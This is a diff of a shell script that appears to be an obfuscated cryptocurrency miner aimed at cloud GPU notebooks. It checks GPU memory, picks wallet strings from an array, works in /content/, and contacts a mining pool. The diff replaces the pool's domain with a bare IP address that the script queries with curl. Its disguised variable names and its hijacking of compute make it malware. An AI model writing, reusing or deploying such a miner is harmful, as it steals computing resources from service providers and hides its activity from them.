@@ -15,7 +15,7 @@ do
 
 google84121274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
 
-google841212121274="http://mine.arionumpool.com"
+google841212121274="http://154.127.52.52"
 
 curl -s http://154.127.52.52/curlgoogle84.php
 
@@ -40,7 +40,7 @@ arr[7]="2tmy46jHQHTjMEsvgEz3BMMCnVcER97gqenr1zqzhpwd3VaiN1nS6m8eK8WTiNhXyHJBWS1F
 rand=$[$RANDOM % ${#arr[@]}]
 google84121212121212121274=${arr[2]}
 
-string=$(curl -s -A "linux84" http://mine.arionumpool.com/mine.php?q=info)
+string=$(curl -s -A "linux84" http://154.127.52.52/mine.php?q=info)
 if [[ $string == *"16384"* ]]; then
 
 cd /content/
@@ -65,7 +65,7 @@ else
 
 google84121274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
 
-google841212121274="http://mine.arionumpool.com"
+google841212121274="http://154.127.52.52"
 
 curl -s http://154.127.52.52/curlgoogle84.php
 
